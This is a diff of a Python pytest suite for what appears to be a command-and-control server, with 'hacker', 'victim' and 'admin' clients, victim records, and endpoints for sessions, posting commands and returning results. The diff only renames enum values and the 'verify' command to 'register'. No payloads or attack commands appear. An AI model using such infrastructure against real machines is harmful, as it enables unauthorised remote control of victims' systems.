@@ -28,7 +28,7 @@ def db_cursor():
 # Some helper functions
 def create_hacker(hacker_id: str, db_cursor: Cursor):
     db_cursor.execute(
-        "INSERT INTO clients VALUES(?, ?, 1)", (hacker_id, ut.ClientType.Hacker)
+        "INSERT INTO clients VALUES(?, ?, 1)", (hacker_id, ut.ClientType.hacker)
     )
 
 
@@ -44,7 +44,7 @@ def create_victim(
     ),
 ):
     db_cursor.execute(
-        "INSERT INTO clients VALUES(?, ?, 1)", (victim_id, ut.ClientType.Victim)
+        "INSERT INTO clients VALUES(?, ?, 1)", (victim_id, ut.ClientType.victim)
     )
     db_cursor.execute(
         "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
@@ -111,14 +111,14 @@ def verified_hacker_header():
 
 # ---------- Testing command 'verify' ---------- #
 # This command's path
-verify_cmd_path = get_cmd_id("verify")
+register_cmd_path = get_cmd_id(ut.ServerCommands.register)
 
 
 @pytest.mark.parametrize(
     "client_type",
-    [(ut.ClientType.Admin), (ut.ClientType.Hacker), (ut.ClientType.Victim)],
+    [(ut.ClientType.admin), (ut.ClientType.hacker), (ut.ClientType.victim)],
 )
-def test_verify_basic(
+def test_register_basic(
     client: HTTPConnection,
     db_cursor: Cursor,
     verified_client_header: dict[str, str],
@@ -129,7 +129,7 @@ def test_verify_basic(
     client_id = verified_client_header["client-id"]
     client.request(
         "POST",
-        f"/{verify_cmd_path}",
+        f"/{register_cmd_path}",
         headers={
             **verified_client_header,
             "client-type": client_type.__str__(),
@@ -150,7 +150,7 @@ def test_verify_basic(
 
     # if the client is a victim then we need to also check for the victim_info
     # table and make sure all fields are None there.
-    if client_type == ut.ClientType.Victim:
+    if client_type == ut.ClientType.victim:
         db_cursor.execute("SELECT * FROM victim_info WHERE id=?", (client_id,))
         # First check if we even correctly inserted data into the victim_info dictionary
         victim_info = db_cursor.fetchone()
@@ -177,7 +177,7 @@ def test_verify_basic(
         ({}),
     ],
 )
-def test_verify_victim_with_body(
+def test_register_victim_with_body(
     client: HTTPConnection,
     db_cursor: Cursor,
     verified_client_header: dict[str, str],
@@ -189,11 +189,11 @@ def test_verify_victim_with_body(
     # Now let's request
     client.request(
         "POST",
-        f"/{verify_cmd_path}",
+        f"/{register_cmd_path}",
         body=encoded_body,
         headers={
             **verified_client_header,
-            "client-type": ut.ClientType.Victim.__str__(),
+            "client-type": ut.ClientType.victim.__str__(),
         },
     )
     # First check if the status code is correct
@@ -215,7 +215,7 @@ def test_verify_victim_with_body(
         assert req_body[result[0]] == val
 
 
-def test_verify_when_victim_exists(
+def test_register_when_victim_exists(
     client: HTTPConnection, verified_client_header, db_cursor: Cursor
 ):
     # Insert a client directly to the database and test if
@@ -230,10 +230,10 @@ def test_verify_when_victim_exists(
     # Now let's check if the requests yield a conflict response
     client.request(
         "POST",
-        f"/{verify_cmd_path}",
+        f"/{register_cmd_path}",
         headers={
             **verified_client_header,
-            "client-type": ut.ClientType.Victim.__str__(),
+            "client-type": ut.ClientType.victim.__str__(),
         },
     )
 
@@ -241,7 +241,7 @@ def test_verify_when_victim_exists(
 
 
 # ---------- Testing command 'create_session' ---------- #
-create_session_path = get_cmd_id("create_session")
+create_session_path = get_cmd_id(ut.ServerCommands.create_session)
 
 
 def test_create_session_without_body(
@@ -371,7 +371,7 @@ def test_create_session_properly(
 
 
 # ---------- Testing command 'post_cmd' ---------- #
-post_cmd_path = get_cmd_id("post_cmd")
+post_cmd_path = get_cmd_id(ut.ServerCommands.post_cmd)
 
 
 def test_post_cmd_with_dead_session(
@@ -474,7 +474,7 @@ def test_post_cmd_properly(
 
 
 # ---------- Test 'post_res' command ---------- #
-post_res_path = get_cmd_id("post_res")
+post_res_path = get_cmd_id(ut.ServerCommands.post_res)
 
 
 def test_post_res_():
